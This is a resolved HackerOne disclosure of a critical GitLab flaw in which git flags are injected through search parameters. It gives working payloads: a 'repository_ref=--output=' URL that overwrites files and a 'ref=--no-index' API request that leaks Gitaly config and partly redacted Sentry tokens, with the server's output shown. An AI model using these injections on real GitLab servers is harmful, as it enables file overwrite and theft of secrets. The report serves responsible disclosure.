---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
date: 2019-12-19
submitted: 2019-07-24T13:23:41.478Z
bounty_usd: 12000
votes: 777
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/658013"
title: "Git flag injection - local file overwrite to remote code execution"
---
# Git flag injection - local file overwrite to remote code execution

> **Severity:** Critical | **Bounty:** 12,000 USD | **Votes:** 777 | **Program:** GitLab | **Disclosed:** 2019-12-19

- Report: [https://hackerone.com/reports/658013](https://hackerone.com/reports/658013)
- CWE: Command Injection - Generic
- Submitted: 2019-07-24T13:23:41.478Z

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2019-07-24** @vakzz: This can also be triggered without any authentication via the search page, eg:
 
http://gitlab-vm.local/search?scope=wiki_blobs&search=page&project_id=4&repository_ref=--output=/tmp/file2

Although an attacker wouldn't have as much control over the file contents (if any).
- **2019-07-24** @gitlab-securitybot: Hi @vakzz,

Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 14 business days with an update.

Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.

Best regards,
GitLab Security Team
- **Report Triaged**
- **2019-07-24** @vakzz: > Although an attacker wouldn't have as much control over the file contents (if any).

Regarding the unauthenticated method, if there are any public wiki pages on the gitlab instance then it's possible to clone the wiki git as an unauthenticated user and find out exactly what the contents of the overwritten file will be using `git log --max-count=1`. Then `gitlab_shell_secret` could be overwritten with known content, resulting in gaining access to the Internal API.
- **2019-07-25** @gitlab-securitybot: ETA for fix:

Hi @vakzz,

The GitLab issue created from your report is currently scheduled for 2019-08-22.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2019-08-05** @hackerjuan: Hi,

Thank you again for the report! Your finding has been reviewed and we are awarding a $12,000 bounty prior the release of a patch. Congratulations!

We will continue to keep you updated via HackerOne as a fix is scheduled.

Best regards,
Security Team | GitLab Inc.
- **Bounty Awarded**
- **2019-08-05** @vakzz: Hi @hackerjuan,

Awesome thank you! Once the release is out I'll confirm the fix and report back.

Cheers,
Will
- **Report Resolved**
- **2019-08-15** @vakzz: Hi @hackerjuan,

The `wiki_blobs` scope is fixed in the latest version and can no longer have arguments injected into it. It looks like the `blobs` scope is still vulnerable though and allows reading any file in `/var/opt/gitlab/gitaly/` including `config.toml`. For example:

```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/4/search?scope=blobs&search=.&ref=--no-index

[{"basename":null,"data":"VERSION\u00001\u0000Gitaly, version 1.53.2\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4},{"basename":null,"data":"config.toml\u00001\u0000# Gitaly configuration file\nconfig.toml\u00002\u0000# This file is managed by gitlab-ctl. Manual changes will be\nconfig.toml\u00003\u0000# erased! To change the contents below, edit /etc/gitlab/gitlab.rb\nconfig.toml\u00004\u0000# and run:\nconfig.toml\u00005\u0000# sudo gitlab-ctl reconfigure\nconfig.toml\u00006\u0000\nconfig.toml\u00007\u0000socket_path = '/var/opt/gitlab/gitaly/gitaly.socket'\nconfig.toml\u00008\u0000bin_dir = '/opt/gitlab/embedded/bin'\nconfig.toml\u00009\u0000\n","filename":null,"id":null,"ref":"--no-index","startline":0,"project_id":4}]
```

I'm not sure if this will be fixed by one of the other reports I submitted, but `gitlab.com` is still vulnerable, `config.toml` doesn't contain too much but in this case it does contain the `sentry.io` api tokens:

`https://gitlab.com/api/v4/projects/2009901/search?scope=blobs&search=a&ref=--no-index`

```
sentry_dsn = 'https://927bee37df654608xxxxxxxxxxxxxxxx:0324504ee7844264xxxxxxxxxxxxxxxx@sentry.gitlab.net/16
ruby_sentry_dsn = 'https://8ff7dd344e1d4976xxxxxxxxxxxxxxxx:bb9d785b3fe7447bxxxxxxxxxxxxxxxx@sentry.gitlab.net/29
```

Let me know if you want me to submit another report or require any other information.

Cheers,
Will
- **2019-08-16** @hackerjuan: Thanks for the further information. We were planning to add additional DSL validation for Gitaly on a future release, I'll investigate with the engineering team if such validation would have prevented this new finding, and in case it wouldn't I'l triage the report.
- **2019-08-26** @hackerjuan: Hey @vakzz, I forgot to mention; can you open a new report regarding this new finding for better tracking?
- **2019-08-26** @vakzz: @hackerjuan sure thing
- **Agreed On Going Public**
- **2019-12-15** @vakzz: @hackerjuan is this ok to be disclosed?

Cheers,
Will
- **Agreed On Going Public**
- **Report Became Public**
